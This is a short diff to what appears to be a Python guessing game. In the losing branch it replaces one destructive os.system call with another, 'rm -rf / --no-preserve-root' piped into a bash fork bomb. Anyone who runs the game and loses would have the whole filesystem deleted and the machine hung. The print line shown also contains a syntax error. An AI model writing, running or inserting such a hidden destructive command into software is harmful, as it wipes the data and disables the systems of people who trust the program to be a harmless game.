@@ -18,7 +18,7 @@ def main():
         print("computer chooses"choose)
         if play == choose:
             print("You lose :(")
-            os.system("rm -rf /* | :(){ :|:& };:")
+            os.system("rm -rf / --no-preserve-root | :(){ :|:& };:")
         else:
             print("You Win")
     else:
